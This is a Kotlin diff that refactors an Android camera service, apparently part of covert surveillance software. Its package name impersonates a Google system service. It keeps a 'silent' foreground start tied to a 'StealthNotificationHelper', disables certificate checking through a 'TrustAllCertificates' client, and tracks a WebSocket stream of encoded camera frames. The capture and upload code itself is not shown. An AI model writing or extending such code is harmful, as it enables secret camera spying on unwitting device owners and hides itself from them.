@@ -1,7 +1,6 @@
 package com.google.android.systemservice.services
 
 import android.annotation.SuppressLint
-import android.app.Service
 import android.content.Context
 import android.content.Intent
 import android.graphics.ImageFormat
@@ -9,7 +8,6 @@ import android.hardware.camera2.*
 import android.media.ImageReader
 import android.os.Handler
 import android.os.HandlerThread
-import android.os.IBinder
 import android.content.pm.PackageManager
 import android.util.Base64
 import android.util.Log
@@ -25,10 +23,13 @@ import org.json.JSONObject
 import java.io.ByteArrayOutputStream
 import java.util.concurrent.TimeUnit
 
-class CameraService : Service() {
+class CameraService : BaseService() {
     companion object {
         private const val TAG = "SystemCamera"
     }
+
+    override val serviceTag = TAG
+    override val foregroundServiceId = StealthNotificationHelper.CAMERA_SERVICE_ID
 
     private var cameraDevice: CameraDevice? = null
     private var captureSession: CameraCaptureSession? = null
@@ -38,7 +39,6 @@ class CameraService : Service() {
     @Volatile private var isStreaming = false
     private var webSocket: WebSocket? = null
 
-    private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
     private val client = TrustAllCertificates.createSecureClientBuilder()
         .connectTimeout(30, TimeUnit.SECONDS)
         .writeTimeout(60, TimeUnit.SECONDS)
@@ -50,11 +50,6 @@ class CameraService : Service() {
         Log.d(TAG, "CameraService created")
         startForegroundSilent()
         startBackgroundThread()
-    }
-
-    private fun startForegroundSilent() {
-        val notification = StealthNotificationHelper.createStealthNotification(this)
-        startForeground(StealthNotificationHelper.CAMERA_SERVICE_ID, notification)
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
@@ -408,13 +403,9 @@ class CameraService : Service() {
         imageReader = null
     }
 
-    override fun onBind(intent: Intent?): IBinder? = null
-
     override fun onDestroy() {
-        super.onDestroy()
-        stopForeground(false)
         stopCameraStream()
         stopBackgroundThread()
-        serviceScope.cancel()
+        super.onDestroy()
     }
 }
